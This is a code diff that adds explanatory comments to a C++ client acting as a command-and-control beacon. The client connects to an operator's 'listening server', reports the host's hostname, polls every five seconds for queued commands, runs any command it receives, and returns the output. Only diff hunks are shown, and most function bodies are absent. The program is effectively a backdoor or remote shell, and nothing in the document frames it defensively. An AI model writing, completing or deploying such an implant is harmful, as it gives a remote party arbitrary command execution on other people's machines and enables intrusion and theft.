@@ -17,6 +17,7 @@ using namespace std;
 string clientHostname{};
 unordered_set<string> seenIPs;
 
+// this will attempt to connect to our listening server
 int connect_to_server(const string& ip, int port)
 {
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
@@ -45,6 +46,7 @@ int connect_to_server(const string& ip, int port)
     return sockfd;
 }
 
+// this straightforwardly executes any given command
 string execute(const string& command)
 {
     string output = "";
@@ -67,6 +69,7 @@ string execute(const string& command)
     return output;
 }
 
+// this handles anything we're outputing
 void outputing(const string& ip, int port, atomic<bool>& running)
 {
     while (running)
@@ -88,6 +91,7 @@ void outputing(const string& ip, int port, atomic<bool>& running)
             }
         }
 
+        // after connecting, we check if there's an available command
         cout << "[client] Checking Queue." << endl;
         string cmd = recv_all(connfd);
 
@@ -114,7 +118,7 @@ void outputing(const string& ip, int port, atomic<bool>& running)
 
         close(connfd);
 
-        this_thread::sleep_for(chrono::seconds(5));
+        this_thread::sleep_for(chrono::seconds(5)); // waiting before checking again. during this, commands might be pushed
     }
 }
 
@@ -149,11 +153,13 @@ int main(int argc, char* argv[])
 
     atomic<bool> running = true;
 
+    // this is so that we can send out our hostname with each beacon, so the server has more clarity
     char hostname[256];
     gethostname(hostname, sizeof(hostname));
     clientHostname = hostname;
 
     thread outputThread(outputing, ref(ip), port, ref(running));
 
-    outputThread.join(); // wait here
+    // wait here
+    outputThread.join();
 }
